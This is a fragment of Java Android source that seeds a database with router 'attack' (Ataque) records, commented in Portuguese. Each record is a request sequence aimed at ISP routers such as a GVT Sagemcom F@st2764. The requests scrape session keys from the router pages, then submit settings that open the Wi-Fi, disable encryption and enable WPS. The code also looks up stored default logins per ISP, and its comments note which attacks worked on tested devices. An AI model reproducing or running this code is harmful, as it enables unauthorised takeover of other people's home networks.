			mPostGetDao.insert(new PostGet(360, 32, 8, "get", "/wancfg.cmd?action=refresh", "", 1));
			mPostGetDao.insert(new PostGet(361, 32, 9, "get", "/wlswitchinterface0.wl", "", 1));
			mPostGetDao.insert(new PostGet(362, 32, 10, "get", "/wancfg.cmd?action=refresh", "", 1));
			mPostGetDao.insert(new PostGet(363, 32, 11, "get", "/wlsecurity.html", "WscMode       = \'(.*?)\';;" +
																				   "WscIRMode   = \'(.*?)\';;" +
																				   "WscAPMode  = \'(.*?)\';;" +
																				   "wep = \'(.*?)\';;" +
																				   "wpa = \'(.*?)\';;" +
																				   "ssidIdx = \'(.*?)\';;" +
																				   "sessionKey=\'(.*?)\'", 1));
			mPostGetDao.insert(new PostGet(364, 32, 12, "get", "/wancfg.cmd?action=refresh", "", 1));
			mPostGetDao.insert(new PostGet(365, 32, 13, "get", "/wlsecurity.wl?wl_wsc_mode=insereWscMode" +		//enabled
																			 "&wl_wsc_reg=insereWscIRMode" +		//enabled
																			 "&wsc_config_state=insereWscAPMode" +		//1
																			 "&wlAuthMode=open" +
																			 "&wlAuth=0" +
																			 "&wlWep=inserewep" +		//disabled
																			 "&wlWpa=inserewpa" +		//aes
																			 "&wlKeyBit=0" +
																			 "&wlPreauth=0" +
																			 "&wlSsidIdx=inseressidIdx" +		//0
																			 "&wlSyncNvram=1" +
																			 "&sessionKey=inseresessionKey", "", 1));		//1045733513
			mPostGetDao.insert(new PostGet(366, 32, 14, "get", "/wancfg.cmd?action=refresh", "", 1));
			mPostGetDao.insert(new PostGet(368, 32, 15, "get", "/wlsecrefresh.wl?wlRefresh=0", "", 1));		//TIMEOUT		

//		GVT Sagemcom PowerBox F@st2764		***WORK BUT TIMEOUT***						
		mAtaqueDao.insert(new Ataque(33, "abrirrede", "gvt", 0, "Sagemcom PowerBox F@st2764"));			
			mPostGetDao.insert(new PostGet(369, 33, 1, "get", "", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));			
			mPostGetDao.insert(new PostGet(370, 33, 2, "get", "/index.cgi?page=internet&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />", 1));		//LYV3asCclcVeD8hLhP5zOvFO7DlO2d9
			mPostGetDao.insert(new PostGet(371, 33, 3, "get", "/index.cgi?page=wifi&sessionid=inseresessionid", "<input type=\"hidden\" name=\"sessionid\" value=\"(.*?)\" />;;" +
																												"<input type=\"text\" name=\"ssid\" autocomplete=\"off\" value=\"(.*?)\" maxlength=\"32\" style=\"width: 168px; background-color: #FFFFFF\" onchange=\"UpdateForm\\(\\)\" onkeyup=\"UpdateForm\\(\\)\" title=\"Input Guest SSID\" />;;", 1));		//LYV3asCclcVeD8hLhP5zOvFO7DlO2d9
			mPostGetDao.insert(new PostGet(372, 33, 4, "post", "/index.cgi", "", 2));		//TIMEOUT			
				mParamsDao.insert(new Params(353, 372, "page", "wifi"));		
				mParamsDao.insert(new Params(354, 372, "sessionid", "inseresessionid"));		//LYV3asCclcVeD8hLhP5zOvFO7DlO2d9						
				mParamsDao.insert(new Params(355, 372, "action", "submit"));		
				mParamsDao.insert(new Params(356, 372, "update", "1"));		
				mParamsDao.insert(new Params(357, 372, "wifistatus", "1"));		
				mParamsDao.insert(new Params(358, 372, "broadcast", "1"));				
				mParamsDao.insert(new Params(359, 372, "ssid", "inseressid"));		//GVT-58B2		
				mParamsDao.insert(new Params(360, 372, "securitymode", "0"));		
				mParamsDao.insert(new Params(361, 372, "Gvtpincode", ""));		
				mParamsDao.insert(new Params(362, 372, "mode", "6"));		//Auto B/G/N	
				mParamsDao.insert(new Params(363, 372, "channel", "-1"));		//Auto		
				mParamsDao.insert(new Params(364, 372, "transpower", "100"));	
				mParamsDao.insert(new Params(365, 372, "statuswmm", "1"));			
				mParamsDao.insert(new Params(366, 372, "statusapsd", "1"));	
			
		/*******************************************************End Abrir Rede******************************************************/
				
				
		Log.i("INSERT_TABLES", "Tabelas preenchidas com sucesso");
		
	}
	
	public void selectAll() {
		mAtaqueDao.getAll();
		
		mPostGetDao.getAll();
		
		mParamsDao.getAll();
		
		mUsuarioDao.getLoginPorOperadora("oi");
		mUsuarioDao.getLoginPorOperadora("gvt");
		mUsuarioDao.getLoginPorOperadora("net");		
	}		
	
	
}
